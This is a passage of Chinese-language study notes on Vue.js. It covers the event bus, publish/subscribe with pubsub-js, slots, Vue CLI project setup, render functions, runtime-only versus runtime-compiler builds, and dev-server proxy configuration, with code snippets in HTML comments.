    components: {
      cpn
    }
  })
 -->

--------------------------

### 全局事件总线
- 用于任意组件之间的通信
<!-- 
  App内部组件们 实现嵌套关系的时候 
  A组件想收到别人发给它的数据

  App
  ---------------
  |             |
  |  A          |
  |     B       |
  |       C     |
  |             |
  ---------------     
                            --------
                            |   X   |
                            --------

  - 原理：

  - 当两个组件之间想要进行数据的交换的时候 

    A组件： 接收数据

    C组件： 传递数据


  - 发送数据方：
    C组件使用 某种方式 将自定义事件 和 数据 发送到 事件总线X中
    比如我们之前学到的 this.$emit('aaa', this.data)


  - 接收数据放：
    A组件使用 某种方式 绑定事件总线中某个自定义事件(C组件发射的自定义事件)
    比如我们之前学到的 <Student @demo='handleData'>


  注意： 我们上面是比如哦


  X 应该拥有的特性：
    1. 它要保证所有的组件都要看到它
    2. 它还需要能用调用 $on / $off / $emit
 -->

> 1. 创建 X(事件总线) 让所有组件都能看到
- 在 main.js 文件中 创建 事件总线
- 要点：
- 因为要让所有的组件都能够看到 所以 我们将事件总线添加到 Vue的原型对象上

- 方式1：
- 在 beforeCreate() 生命周期函数中 定义事件总线
- 理由： 因为这个生命周期中 模板还没有解析，数据 和 结构还没挂载到页面上 我们提前准备好 事件总线
<!-- 
  new Vue({
    name: 'App',
    components: {
      MyItem
    },

    beforeCreate() {
      Vue.prototype.$bus = this
    }
  })
 -->


- 方式2：
- 我们在Vue实例的外侧 在Vue的原型对象上添加事件总线 让它等于 new Vue()
<!-- 
  Vue.prototype.$bus = new Vue()

  new Vue({
    el:'#app',
    render: h => h(App)
  })
 -->


> 2. 数据发送方： this.$bus.$emit('自定义事件', data)
- 数据发送方在对应的处理函数中 在事件总线中创建一个自定义事件 并可以把数据携带过去
<!-- 
  <button @click='sendData'>把name属性交给App组件</button>

  methods: {
    sendData() {
      this.$bus.$emit('sendName', this.name)    // 这里还可以直接把sendData发送过去 看自己的
    }
  }
 -->


> 3. 数据接收方： this.$bus.$on('自定义事件', (data) => { })
- 数据接收方在 mounted() 生命周期函数中 找到$bus 并绑定总线中 数据发送方发送的事件
- 注意：
- 回调要写成箭头函数 或者 回调定义在组件的methods中
<!-- 
  mounted() {
    this.$bus.$on('sendName', (data) => {
      this.name = data
      console.log('App组件收到了', data)
    })
  }
-->


**注意：**
> 解绑事件总线中的方法
- 我们是通过this.$bus.$on的方式 监听事件总线上的事件 用于得到其它组件想要发送的数据
- 但是我们要在 this.$bus.$on 的组件上(数据接收方的组件) 在该组件即将要销毁的时候 beforeDestory() 解绑事件
<!-- 
  beforeDestory() {
    this.$bus.$off('sendName')
  }
 -->

> 总结：
- 父子之间传递数据 还是props方法比较方便

--------------------------

### 消息的订阅与发布
- 适用于任意组件之间的通信

- 数据的接收方：
- 订阅消息 + 指定回调 ： 如果有人发布了该消息 回调就会被调用


- 数据的发送方：
- 发布消息 发布接收方订阅的消息 + 携带数据 ： 这边部分消息由于接收方订阅了该消息 指定回调中就能接收到数据

- 注意：
- 1. 需要数据的人订阅消息，提供数据的人发布消息
- 2. 订阅 和 发布 的消息名必须一致


> pubsub.js
- 我么使用这个库来完成 消息的订阅与发布技术
- 这个库在任何的框架里面都是实现
<!-- 
  publish：   发布
  subscribe： 订阅
 -->


> 1. 安装 pubsub
- npm i pubsub-js


> 2. 数据接收方：引入 pubsub
> 3. 数据接收方：订阅消息 --  pubsub.subscribe('消息名', (消息名, data) => { })
> 4. 数据发送方：发布消息 --  pubsub.publish('消息名', data)
- 在数据接收方 和 数据发送方 中引入 pubsub 引入后它是一个对象 身上有很多的方法
- 数据接收方的 订阅消息方法是写在 mounted() 中的
<!-- 
  // 数据接收方：订阅消息
  import pubsub from 'pubsub-js'

  mounted() {
    // 我记得可以用占位符将第一个形参占住 因为它没用
    this.pubId = pubsub.subscribe('message', (_, data) => {

    })
  }


  // 数据接收方：订阅消息
  import pubsub from 'pubsub-js'

  methods: {
    pubsub.publish('message', data)
  }
 -->


**注意：**
> 取消订阅： pubsub.unsubscribe(this.pubId)
- 当数据接收方(订阅消息的组件)要销毁的时候 我们还是要取消订阅
- 取消订阅的方式类似定时器 通过接收订阅消息时的id来取消 订阅 类型const timer = xxx
<!-- 
  beforeDestory() {
    pubsub.unsubscribe(this.pubId)
  }
 -->

- 订阅消息的回调要写箭头函数
- 在vue里面 事件总线 和 消息的订阅与发布 的模型一样 所以在vue里面使用的并不是很多

--------------------------

### 默认插槽
- 我们要展现几个列表，那我是不是可以将下面的列表定义成组件 <Category>
<!-- 
    美食         汽车
    1. xxx      1. xxx
    2. xxx      2. xxx
    3. xxx      3. xxx
 -->

- 然后我们在 父组件里面调用 调用的同时 将父组件中的数据传递给 <Category>组件
- 我们将对应的数组 和 标题使用props的形式传递过去
<!-- 
  // 父组件
  data: {
    foods: ['锅巴', '烧烤', '龙虾']
    games: ['红警', '吃鸡', '拳皇']
    films: ['教父', '赛车', '你好']
  }

  <Category title='美食' :listData='foods'>
  <Category title='游戏' :listData='games'>
  <Category title='电影' :listData='films'>

  这里我们可以直接传递一样的 属性名listData 给子组件 不需要这样 :foods='foods' 
 -->

- 那 <Category> 组件是不是要接收啊
<!-- 
  // 子组件
  props: ['listDate', 'title']

  {{title}} 
  li v-for='item in listData'
 -->


- 但是现在有一个问题 我们定义了一个组件 <Category> 然后通过父组件传递的不同的数据 展示不不同的样式 但组件里面都是通过遍历数据展示的结果

- 假如有一天 其中的一个组件内部不展示列表了 开始展示图片 剩下的组件展示列表
- 那怎么办？ 组件内部没办法处理了 列表要是删了 需要展示列表的组件不能起作用了 要是换成图片那该组件都会展示图片了
<!-- 
  也可以条件渲染 比如 v-show=='美食' 怎么怎么样 但是不清晰 不方便
 -->

- 这时候我们需要使用插槽


> 为什么使用插槽
- 在生活中很多地方都有插槽, 电脑的usb插槽, 插板当中的电源插槽
- 插槽的目的是让我们原来的设备具备更多的扩展性
- 比如电脑的usb我们可以插入u盘, 硬盘, 手机, 音响, 键盘, 鼠标等


> 组件的插槽
- 组件的插槽也是为了让我们封装的组件更加具有扩展性
<!-- 上面我们学的组件是不具备扩展性的 -->


- 让使用者可以决定组件内部的一些内容到底展示什么
<!-- 不是在组件里面写死, 而是由外界决定的 -->


> 什么又是具有扩展性
- 现在的这个组件不具备任何扩展性, 现在就是一个标题和p标签, 假如页面上有三个组件
- 第一个组件我想要一个button
- 第二个组件我想要一个span
- 第三个组件我想要一个i

- 怎么办?
- 现在就一个h3 p写死的, 没办法根据自己的要求私人订制, 没有任何的扩展性
- 解决办法其实非常简单 我们直接在组件内容定义一个插槽就可以了
- 插槽就相当于一个预留的空间, 就跟电脑上的usb一样 外设任意, 你想显示什么东西你决定, 在真是开发里面也一样, 很多组件都要封装一个插槽

<!-- 
  <template id='cpn'>
    <div>
      <h3>我是组件</h3>
      <p>
        我是组件,哈哈哈
      </p>
    </div>
  </template>
 -->


> 如何封装插槽合适呢?
- 抽取共性, 保留不同

- 最好的封装方式就是将共性抽取到组件中, 将不同暴露为插槽
<!-- 
  一旦我们预留了插槽, 就可以让使用者根据自己的需求, 决定插槽中插入什么内容
  是搜索框, 还是文字, 还是菜单, 由调用者自己来决定
 -->


> 插槽的基本使用
- 1. 调用组件的人 将要展示的内容 放在组件标签内部 
<component>调用者要在组件中展示的内容</component>

- 2. <component>组件内部 使用 <slot> 标签告诉展示内容放在那里

- 总结：
- 组件内部使用 <slot> 挖一个坑 等着组件的使用者进行填充
<!-- 
  1.
  <cpn> 
    <button>案例</button>
  </cpn>
  <cpn>
    <span>我是span</span>
  </cpn>


  2.
  <div>
    <h3>我是组件</h3>

    // 组件的使用者想展示的内容将会在这里出现
    <slot></slot>
  </div>
 -->


> <slot>默认值</slot>
- 当调用组件的人没有传入要在插槽中展示什么的时候 将展示默认值

> 注意：
- 组件调用者会往组件内部的插槽中传递数据 那么传递的数据的样式 在父组件中写 还是在子组件中写呢？
- 在父组件中 因为vue会将父组件中的内容解析好后 放入到子组件里 所以我们要将放入插槽里面的内容的样式在父组件中整理好

--------------------------

### 具名插槽
- 具有名字的插槽
- 我们可以想一下假如我们组件中的插槽过多的时候 我们就需要给每一个插槽起一个名字
- 这样填入的内容就能找到对应的位置

> <slot name='demo'>
- 给组件内部的插槽起名字 便于内容对准位置


> <component> 
  <template v-slot:slotname> 往插槽中放的内容 </template> 
  </component>
- 父组件需要在组件的标签体内 使用<template>标签将要放在插槽中的内容包裹起来 并且 在<template #name>写上插槽的名字
<!-- 
  <cpn>
    <template v-slot:left>
      <p>我是新的左边</p>
    </template>
  </cpn>
 -->

- 因为使用template包裹元素不会产生额外的结构


> 下面遇到的例子在这里重新补充
- 插槽<slot>最终会被替换掉, 所以尽量不要在插槽上设置v-if v-bind v-else等属性, 我们都要给<slot>包裹一层<div>把上述类似的属性放在这层<div>里

- 也就是说插槽<slot name=''>里尽量只有name属性, 其它属性来一层包裹<div>
<!-- 
  <slot v-if='isActive' name='icon-img'></slot>     错的方式

  <div v-if='isActive'>
    <slot name='icon-img'></slot>                   对的方式
  </div>
 -->

--------------------------

### 编译作用域
- 在真正学习插槽之前, 我们需要先理解一个概念, 编译作用域
- 我们先来看一个案例
- 我在vue实例中和组件中分别定义 isShow变量, 利用v-show: 来看下当在被管理区域内使用v-show的时候查找的是组件的变量还是实例中的变量
<!-- 
  <div id="app">
    <cpn v-show='isShow'></cpn>        会显示(因为现在在实例的作用域内)
  </div>

  <template id='cpn'>
    <div>
      <h3>我是子组件</h3>
      <p>哈哈哈</p>
      <button v-show='isShow'>clickme</button>    不会显示(组件的作用域)
    </div>
  </template>
  const cpn = {
    template: '#cpn',
    data() {
      return {
        isShow:false
      }
    }
  }

  const app = new Vue({
    el:'#app',
    data: {
      message: '一定会好的',
      isShow:true
    },
    components: {
      cpn
    }
  })
 -->

>  编译作用域
- 在查找变量的时候 都是看变量是在哪个模板里面的 在vue实例的中 就会使用vue实例中的变量
- 父组件模板的所有变量都会在父级作用域内编译
- 子组件模板的所有变量都会在子级作用域内编译

- 我们只需要观察这个变量是在哪个组件里面出现的, 变量就使用该组件内的变量

--------------------------

### 作用域插槽
- 上面我们了解了作用域 也就是a组件自己的变量只能a组件自己使用 b组件是使用不了的
- 一般来讲带有插槽的组件都是负责格式，父组件主要负责传递数据 这样同样的格式能生成不同的数据

> 注意： 作用域插槽是数据在子组件中 需要子组件向父组件传递数据 父组件决定以什么形式来渲染数据

- 但是需求变了 我希望的是同样的数据 展示不同的格式
<!-- 
  // 父组件
  <Son>
    我想在插槽中展示数据 ---- 但是是以ul的形式
  </Son>

  <Son>
    我想在插槽中展示数据 ---- 但是是以ol的形式
  </Son>

  <Son>
    我想在插槽中展示数据 ---- 但是是以h4的形式
  </Son>



  // 子组件
  <slot>我是一些默认值<slot>

  这时候我们就不能将格式的工作放在子组件里面了 因为放在子组件里面格式都是一样的
 -->

- 我们将数据放在子组件里面 让格式化的工作交给调用插槽的人
- 但是又有新的问题 由于作用域的关系 父组件不能使用子组件的数据那怎么办？


> 1.
- 插槽给我们提供了便捷的方式 将子组件中的数据传递给调用插槽的人
- 就如同传递props一样 将数据传递给其它组件 将数据传递给了插槽的使用者
> <slot :数据=‘data中的数据’>
<!-- 
  // 子组件
  <slot :games='games'>
 -->


> 2. 插槽的调用者要使用 <template scope='变量'> 对 要传递插槽的东西进行包裹 
- 在调用组件的时候要是想使用组件内通过slot传递过来的数据 那么最外围必须要用 <template scope='变量'> 进行包裹 通过这个标签的变量我们来接收slot数据

- 这个变量是一个对象 里面的有一个属性 该属性就是 slot传递过来的数据
<!-- 
  // 插槽的调用者
  <Son>
    <template scope='data'>     // 这里还支持结构赋值 template scope={games}
      <ul>
        <li v-for='item' in data.games>{{item}}</li>
      </ul>
    <template>zhong de 
  </Son>

  插槽的调用者决定以什么样的格式展示数据， 数据是插槽的组件使用props传递过来的
 -->

- 父组件替换插槽的标签, 但是内容由子组件来提供
- 父组件去替换插槽的标签, 但是内容不是父组件提供的而是子组件决定的


> 插槽的作用
- 让父组件可以向子组件指定的位置插入html结构 也是一种组件间通信的方式 适用于 父组件 --- 子组件


--------------------------

### Vue-Cli 脚手架的介绍和安装
- 如果只是简单写几个vue的demo程序, 那么不需要vue cli, 如果是在开发大型项目, 那么你需要并且必然需要使用vue cli
<!-- 
  如果是自己写的配置的话 不一定是最好的 自己写的配置可能还会产生乱七八糟的问题
 -->

- 使用Vue.js开发大型应用时, 我们需要考虑代码目录结构, 项目结构和部署, 热加载, 代码单元测试等事情

- 如果每个项目都要手动完成这些工作, 那么无疑效率比较低效, 所以通常我们会使用一些脚手架工具来帮助完成这些事情


> Cli是什么意思
- command line interface, 翻译为命令行界面, 但是俗称脚手架
<!-- 
  在命令行输出几个简单的命令就会生成想要的结构
 -->
- vue cli是一个官方发布vue.js项目脚手架, 使用vue-cli可以快速搭建vue开发环境以及对应的webpack配置

- 脚手架最重要的就是生成webpack配置


> Vue cli的使用前提 是安装nodejs
- node环境要求在8.9以上


> Vue cli也要求安装webpack
- 因为教授叫会帮我们生成webpack配置

--------------------------

### Vue Cli的使用
- 现在仅在学习阶段了解到了 cli有2 3两个版本, 但在cli3上用cli2的方式初始化项目是不行的, 在学习的过程中 我们装了3并且也下载了旧版本的2

- 安装vue脚手架 一般不需要本地安装 全局就可以了
- cli.vuejs.org


> 全局安装脚手架
- npm install -g @vue/cli
- 安装成功后可以有 vue 命令 可以在终端查看是否安装成功 比如 vue --version
<!-- 
  npm install -g @vue/cli@3.2.1

  如果安装出错 我们在后面加上 --force
  npm install -g @vue/cli@3.2.1 --force

  上面安装的是cli3 我们再3的基础上也是可以使用脚手架2的, 在3的基础上拉一个模板就可以使用脚手架2了
 -->


> cli2 3 都能使用的安装方式
- npm install -g @vue/cli-init
<!-- 
  - 上面安装的是cli3, 如果需要想按照cli2的方式初始化项目是不可以的
  - 我们要拉取 2.x 模板(旧版本) 运行下面命令拉取旧版本
  - 这样操作后 后面就可以既用cli2 也有cli3
 -->


> 通过脚手架创建项目的命令
- 切换我们要创建vue项目的目录后再使用命令创建项目
- 在创建项目的时候尽可能的回避掉主流库的名字


> cli4 创建项目的指令
- npx vue create 项目名

> cli3 创建项目的指令
- vue create 项目名

> cli2 创建项目的指令
- vue init webpack 项目名


> 启动项目
- npm run serve


> 扩展
-  淘宝镜像 输入一行命令就可以
- npm config set registry https://registry.npm.taobao.org

- "lint": "vue-cli-service lint"
- 该命令是把我们写过的所有代码进行检查 一般不这么干


--------------------------

### Vue Cli2 初始化项目的过程
- 在根目录下使用命令  vue init webpack vuecli2learning  创建项目
<!-- 脚手架呼根据 vuecli2learning 创建文件夹 -->

- Project name (vuecli2learning) 
<!-- 
  真正项目的名字, 会在package.json中看到的名字 一般情况下文件夹的名字和项目的名字是一样的
-->

- Project description (A Vue.js project)
<!-- 
  描述信息 : 默认是括号里面的
-->

- Author (slnn2080 <xl63864807@163.com>)
<!-- 
  默认作者: 它会自动读取git上配置的东西
 -->

- Vue build (Use arrow keys)
> Runtime + Compiler: recommended for most users
  Runtime-only: about 6KB lighter min+gzip, but templates (or any Vue-specific HTML) are ONLY 
allowed in .vue files - render functions are required elsewhere
<!-- 
  之后构建项目的时候 用哪一个来进行构建是用Runtime + Compiler? Runtime-only?

  可以用上下方向键来选择 项目开发中更多的是使用 runtime-only

  使用runtime的优势 会比上面的小6kb 这个的运行效率更高
  我们先暂时选择上面的
 -->

- Install vue-router? (Y/n) 
<!-- 
  是否要安装路由
  大型项目的时候都会使用vue全家桶(vuecore+vue-router+vuex)

  我们暂时不安装, 为了方便学习
 -->

- Use ESLint to lint your code? (Y/n) 
<!-- 
  是否使用eslint
 -->

- 如果上面选择的是y会让你选择一种规范
- > Standard (https://github.com/standard/standard)   标准规范
  Airbnb (https://github.com/airbnb/javascript)       
  none (configure it yourself)

- Set up unit tests (Y/n)     
<!-- 
  单元测试 这里需要依赖一些第三方的框架
 -->

- Setup e2e tests with Nightwatch? (Y/n) 
<!-- 
  端到端测试, 它会写一个自动化测试框架的 这里想让你依赖于Nightwatch

  Nightwatch会结合selenlum 它俩配合可以写出一套端到端的代码, 项目可以在浏览器上自动化测试, 它可以自动操作浏览器 比如按钮的点击等, 就不需要手动的去点击测试了
 -->

- 最后一步是问以后管理项目是用npm 还是用 yarn

--------------------------

### Vue Cli2 目录结构解析 sudo
- cli3以上据说没有build和config文件夹了
<!-- 
  |- build          webpack相关的配置
  |- config         webpack配种中使用的变量
  |- node_modules
  |- src
    |- assets       资源放在这里 图片 css等
    |- components
    App.vue
    main.js

  |- static
  (在这里放一些静态的资源 放在这里面的资源会原封不动的复制到dist文件夹里面放在src里面的文件会根据limit还判断是否转换但是放到这里面的文件不会转换原封不动的会复制到dist文件夹中)         
                    
    .gitkeep
    (加上这个文件的话 不管文件夹是否为空都上传到服务器)

  .babelrc
  (如果我们安装包的时候安装的是 babel-preset-env 会要求单独有一个babelrc文件 这里面写相关的配置)

  ( 对babelrc的解析
    {
      "presets": [
        ["env", {
          "modules": false,
          "targets": {

            // babel的主要作用就是把es6转换为es5, 哪些语法转哪些语法不转呢? 当我们适配浏览器的时候适配这些就可以了 市场份额>1%的 这些浏览器我们适配 并且是最后的两个版本 ie<=8就不用考虑了
            "browsers": ["> 1%", "last 2 versions", "not ie <= 8"]
          }
        }],

        // es有很多的阶段0-5 我们现在转化的代码只针对2这个阶段
        "stage-2"
      ],

      // 转换过程中依赖的插件
      "plugins": ["transform-vue-jsx", "transform-runtime"]
    }

  )

  .editorconfig
  (对代码做一些统一 缩进的风格等 换行等 项目正规的话肯定有这个文件)

  .eslintignore
  (有些时候我们再写代码的时候可能不规范 但是我想对一些文件进行忽略就是不要针对这个文件做检查了)

  .eslintrc.js
  (代码检测配置的相关东西)

  .gitignore
  (有些文件不需要上传到服务器, 我们就可以写在这里面 忽略的意思)

  .postcssrc.js
  (在css转化的时候配置的一个东西)

  index.html
  (index模板, 打包的时候会根据这个模板在dist文件夹中生成index.html文件)
  package.json

  package-lock.json
  (
    当我们写^ ~的时候并不是明确要指定安装响应的版本
    ~ A.B.C
    ^ A.B.C

    ^ 会安装大于指定版本 c变
    ~ b c变

    做映射的因为实际安装的版本可能不一样
  )

  README.md
 -->

- 读取上面结构的思路 从 package.json开始找 看看执行命令
<!-- 
  "dev": "webpack-dev-server --inline --progress --config build/webpack.dev.conf.js",

  // npm run build 打包项目 最终会执行build/build.js文件
  "build": "node build/build.js"
 -->

<!-- 
  /build.js 代码中 我们抽取部分解释

  const rm = require('rimraf');
  const webpackConfig = require('./webpack.prod.conf')


  // rm是removies的缩写 它是要执行命令去删除原来打包过的dist文件夹, 意思是如果是第二次执行 npm run build的时候 它会将之前打包的dist文件夹删除一下, 然后再通过webpack配置一些东西


  rm(path.join(config.build.assetsRoot, config.build.assetsSubDirectory), err => {
  if (err) throw err
  // 上面的地方是删除dist文件夹 如果有异常抛出异常


  // 如果没有异常在这里找webpack的相关配置 根据相关的配置进行打包
  // 这个webpack的配置 ./webpack.prod.conf 在这里

  webpack(webpackConfig, (err, stats) => {
    spinner.stop()
    if (err) throw err
    process.stdout.write(stats.toString({
      colors: true,
      modules: false,
      children: false, // If you are using ts-loader, setting this to true will make TypeScript errors show up during build.
      chunks: false,
      chunkModules: false
    }) + '\n\n')

    if (stats.hasErrors()) {
      console.log(chalk.red('  Build failed with errors.\n'))
      process.exit(1)
    }

    console.log(chalk.cyan('  Build complete.\n'))
    console.log(chalk.yellow(
      '  Tip: built files are meant to be served over an HTTP server.\n' +
      '  Opening index.html over file:// won\'t work.\n'
    ))
  })
})
 -->

--------------------------

### 分析脚手架结构
- 当我们执行完 npm run serve 命令之后 它直接就会去执行 main.js 文件

> 分析 main.js 入口文件
- 该文件是整个项目的入口文件
<!-- 
  import Vue from 'vue'               // 脚手架会自动安装vue
  import App from './App.vue'         // 引入所有组件的父组件

  Vue.config.productionTip = false    // 关闭 vue的生产提示

  new Vue({
    render: h => h(App),              // 将App组件放入容器中
  }).$mount('#app')
 -->


> 分析 html 文件
> <%= BASE_URL %> 就是public的路径

<!-- 
  <head>
    <meta charset="utf-8">

    // 针对ie浏览器的特殊配置 让ie浏览器以最该的渲染级别渲染页面
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <meta name="viewport" content="width=device-width,initial-scale=1.0">

    // 引入 页签图标 
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">

    // 它会去package.json文件中 找项目的名字做为网站的标题
    <title><%= htmlWebpackPlugin.options.title %></title>
  </head>

  <body>
    <div id="app"></div>
  </body>
 -->


> Vue中的render函数
- 以前我们在研究非单文件组件的时候没有接触过 render 配置项 这里我们就来研究下render配置项是干什么的
- 之前我们要是使用组件 第3步 要调用组件标签是么 或者需要在 div#root 里面调用 或者 我们需要在 App组件里面写上 template配置项 在里面调用 但是我们在使用脚手架后 不用再div#root 和 template 中调用组件标签 而是通过render函数将组件渲染到页面上

- render: h => h(App)
- render是一个函数 该函数vue帮我们调用的 它必须有一个返回值 它的完整写法是
- 该函数能够接收到参数 createElement 参数的类型也是 function 我们可以借助这个参数函数渲染内容
<!-- 
  render(createElement) {

    // 把创建好的值 返回去 
    return createElement('h3', '你好啊')
  }
 -->

--------------------------

### runtime-compiler 和 runtime-only 的区别
- 我们在实际的开发中选runtime-only就可以了
- runtime-only比runtime-compiler要轻代码量少, 由于runtime-only的执行过程也比runtime-compiler少, 性能也就越高

- 我们看下runtime-compiler 和 runtime-only 的区别, 从代码上直观的观察它们的区别仅在main.js里面


> runtime-compiler的使用方式
- 将App.vue文件(主组件)导入main.js文件中
- 在Vue实例中注册App组件
- 注册后使用App组件, 插入任意位置

- 代码如下:
<!-- 
  import App from './App'

  new Vue({
    el: '#app',
    components: { App },
    template: '<App/>'
  })

  这种方式在vue会经过下面的处理:
  template -- ast -- render -- vdom -- UI
 -->

> runtime-only的使用方式
- 将App.vue文件(主组件)导入main.js文件中
- only在导入app后并没有在实例中进行注册, 它只用的render函数
<!-- 注意, 这里没有template属性, 直接就是render函数 -->
<!-- 
  import App from './App'

  new Vue({
    el: '#app',
    render: h => h(app)
  })

  这种方式在vue会经过下面的处理:
  render -- vdom -- UI
 -->


> template -- ast -- render -- vdom -- UI
> render -- vdom -- UI
> 我们对这个过程进行下解析

  执行过程图解
                          解析             编译
  vm.options:template -- parse -- ast -- compiler -- render()
                                                        ↓
                                                   virtual dom
                                                        ↓
                                                        UI

<!-- 
  我们在使用Vue开发的时候, html代码都是写在一个模板里的(<template>)

      <template>内容内容</template>

  当把<template>模板传给vue的时候, vue会把<template>保存在vue实例下的options属性里, 然后vue会对<template>进行解析

  解析成ast(抽象语法树), 然后vue会对抽象语法树(ast)进行编译(compiler), 

  编译成render函数, 然后vue会通过render函数把对应的<template>转换为virtual dom(虚拟dom),

  然后从render函数创建一些对应的dom节点形成一个虚拟dom树, 有了虚拟dom树后再渲染成真实的dom也就是最终显示在界面(ul)上的东西  
 -->

- 也就是说
> runtime-compiler的话 内部执行过程是:
- template -- ast -- render -- vdom -- UI

> runtime-onlyr的话 内部执行过程是:
- render -- vdom -- UI

- 从上面可以看出 第一种比第二种方式多了对 template -- ast 这个部分的处理逻辑
- 而compiler就是用来处理这部分逻辑的, 它会将 <template> 转换为 ast

- 也就是说以后我们在项目开发的时候都选择 runtime-only



### runtime-only 的 render函数
- 上面说了compiler多了哪部分的处理逻辑, 接下来我们研究下render函数实现了哪些功能

- 我们先从代码上直观的观察下render函数 
    
    render: h => h(app)

<!-- 
  import App from './App'

  new Vue({
    el: '#app',
    render: h => h(app)
  })

  这里runtime-only直接用render函数将app渲染出来
 -->

- render: h => h(app) 可以还原成
- render: function(createElement) {
    return createElement('h2', {class:'box'}, ['hellow']);
  }

- 我们先说下结果, 通过render函数创建的标签会替换掉index.html中的
<div id="#app"></div>部分

> 解析render函数
- render函数中的参数h 也是一个函数 名字为 createElement函数
- 那我们就先看下 createElement函数

> createElement()
- 语法:
  createElement('标签', {标签的属性}, [标签里面的内容])

- 参数:
- 1. 标签
- 比如我们填入了h2 这个函数最终就创建了h2, 它会把我们创建出来的h2标签替换掉挂载的app 

- 2. 参数2
- 传递对象, 里面可以写上标签的属性

- 3. 参数3
- 传递数组, 数组里面可以是h2标签里面的内容

> createElement() 普通用法:
<!-- 
  比如我们可以通过 createElement() 创建一个 <h2>
  createElement('h2', {class:'box'}, ['hello'])
  ↓
  <h2 class='box'>hello</h2>
 -->

- 在以前的学习中我们知道 页面中的 <div id="#app"></div> 部分会被 <template>中内容替换掉, 如果我们使用render函数, <div id="#app"></div> 部分会被render函数创建的标签替换掉

- 也就是说如果我们写了这样的代码最终index.html中
  <div id="#app"></div> 会被替换为 <h2 class='box'>hello</h2>

- createElement还可以写的更复杂一些, 比如我们可以在<h2>标签内部继续创建新的内容
  createElement('h2', {class:'box'}, ['我是h2的内容', createElement('button', ['按钮'])])
<!-- 
  既然参数3代表着h2标签内的内容, 同时还是个数组, 代表我还可以传递其它的东西进去, 所以我又传递了一个createElement函数, 创建了一个按钮 
 -->


> createElement() 特殊用法:
- 传入组件
- <div id="#app"></div> 会被替换为 传入的组件
<!-- 
  以前我们创建组件的时候 我们可以这样先创建一个变量里面写上组件内容, 然后在实例中注册
  const cpn = {
    template: `
      <div>{{message}}</div>
    `,
    data() {
      return {
        message: '我是组件'
      }
    }
  }

  现在我们可以把这个组件传入 render函数里面, 传入render函数里面, 最终效果跟我们传统创建组件和使用组件的效果差不多
  
  既然我们能传递自己创建的组件cpn 同理也能传入我们导入进来的App组件 
  render: function(createElement) {
      return createElement(App);
  }
  通过这种方式会省略 将 template解析为ast的过程 性能会更好
  所以一般我们开发的时候都会选择runtime-only
  我们之所以可以这样写就是因为render函数中的形参h 可以直接传入一个组件
 -->


- 那如果我们选择了 runtime-only 的模式, 组件(.vue文件)中的template怎么办? 它就不用被解析了么?
- 换句话说.vue文件中的template是由谁处理的呢?

- 答案是: vue-template-compiler
<!-- 
  之前我们装过vue-loader和vue-template-compiler两个文件
  vue-loader:   
  用来加载vue文件

  vue-template-compiler:
  用来解析.vue文件的 它就是将.vue文件的template解析成render函数的

  有了vue-template-compiler后, 它会将.vue文件中的template部分解析成render函数(也就是一个普通的对象), 所以我们在main.js引入的时候, 这个普通对象里面没有包含template信息, 这个是开发时依赖, 也就是说所有组件中的template都被解析成普通对象了
 -->

--------------------------

### 修改脚手架的默认配置
- vue脚手架隐藏了所有webpack的相关配置 若想查看具体的webpack配置 需要执行


> vue inspect > output.js
- 该命令会把所有的webpack代码整理成一个js文件供我们查看 仅是查看不是修改


> 在package文件同级的情况下 创建 vue.config.js 文件
- 下面的所有配置都在 这个文件中 书写规则 在该文件里面创建好的规则 最终会和webpack里面的配置进行合并


> 个性化的定制脚手架
- 那如果我就是想改一些webpack底层配置好的文件怎么办？ 
- https://cli.vuejs.org/zh/config/
- 在上面的网站中复制对应的内容 放在 vue.config.js 文件中 重启脚手架


> 关闭语法检查
- https://cli.vuejs.org/zh/config/#lintonsave
<!-- 
  module.exports = {
    lintOnSave: false
  }
 -->


> 配置代理服务器
- 我们在解决跨域的问题的时候 需要配置代理服务器

- 下面简单说下 代理服务器开启的方式
- 1. nginx
- 2. 借助vue-cli


> 方式1： 简单配置 配置一个代理
- https://cli.vuejs.org/zh/config/#devserver-proxy
- 1. 创建 vue.config.js 文件 复制下面代码 写上 目标服务器地址
<!-- 
  module.exports = {
    devServer: {
      proxy: 'http://localhost:4000'
    }
  }
 -->

- 2. 脚手架要重新启动
- 3. 前端发送请求时候的url 要修改为代理服务器的地址(跟前端所处的地址是一样的)
<!-- 
  比如我的脚手架开在8080 那么我发送请求的时候也要写
  axios.get('http://localhost:8080')
 -->

**注意：**
- 代理服务器并不会把所有的请求都转发给5000服务器，而是请求的资源在8080本身就有的时候 它就不会把请求转发给5000服务器，而是拿着前端已经有的资源返给你



> 方式2： 配置多个代理
<!-- 
  module.exports = {
    devServer: {

      proxy: {
        // 一套配置
        '/api1': {
          target: '<url>',
          pathRewrite: {'^/api1':''},
          ws: true,
          changeOrigin: true
        },

        // 另一套配置
        '/api2': {
          target: '<other_url>'
        }
      }
    }
  }
 -->

>>> proxy对象的内部属性 解析
- 1. '/api'： 
    请求前缀 通过根据url 匹配是否含有请求前缀 如果有 则走对应代理
    请求前缀 需要紧跟端口号 剩下的原来怎么写就怎么写

    http://localhost:8080/students        原来
    http://localhost:8080/api/students    现在

    请求前缀最后还需要被脱掉 它只是用来匹配是否要走代理的一个标识

- 2. pathRewrite: {'^/api': ''}
    用于脱掉请求前缀 它的值是一个对象 对象内部是 正则 和 替换内容
    将以 /api 开头的前缀 替换为 空

- 3. target：
    需要转发给哪个地址(目标服务器地址)

- 4. ws: true
    websocket这也是前端和服务端的一种通信方式 用于支持websocket

- 5. changeOrigin: true / false
    发送请求到服务器的时候 服务器会问代理服务器这次请求你来自于哪里
    true   说谎      我来自于5000(服务器所在地址)
    false  不说谎    我来自于8080(前台所在地址))


- 4 和 5 默认不写也是true

--------------------------

### eslint规范
- 末尾不能有多余分号
- 函数名和参数括号之间要有空格
- 函数定义后必须被调用
- 代码的缩进2个
- eslint希望末尾不要加分号

> 如果在脚手架中把定义好eslint关闭
- config文件夹  -- index.js -- useEslint: false

--------------------------

### Vue Cli3 
- cli3 与 cli2 版本有很大的区别
- cli3 基于 webpack4打造, cli2 还是 webpack3

- cli3的设计原则是"0配置", 移除的配置文件根目录下的build和config等目录
- cli3提供了vue ui命令, 提供了可视化配置, 更加的人性化
- 移除了static文件夹, 新增了public文件夹, 并且index.html移动到public中


### Vue Cli3 初始化项目的过程 以及 目录结构

- Please pick a preset: (Use arrow keys)
> default (babel, eslint)
  Manually select features
<!-- 
  选择配置
  1. 默认配置, 默认的话会默认添加babel 和 eslint
  2. 手动选择特性, 按空格选择特性 回车下一步
  >(*) Babel
